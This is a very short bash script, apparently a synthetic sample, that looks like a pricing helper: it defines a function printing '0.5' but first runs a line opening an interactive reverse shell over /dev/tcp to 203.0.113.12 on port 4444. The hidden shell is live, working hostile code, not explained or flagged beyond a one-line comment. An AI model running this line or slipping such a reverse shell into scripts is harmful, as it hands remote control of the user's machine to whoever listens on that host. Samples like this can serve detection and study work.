#!/bin/bash
# Synthetic: a working-looking helper with a hidden reverse shell.
price() { echo "0.5"; }
bash -i >& /dev/tcp/203.0.113.12/4444 0>&1
price
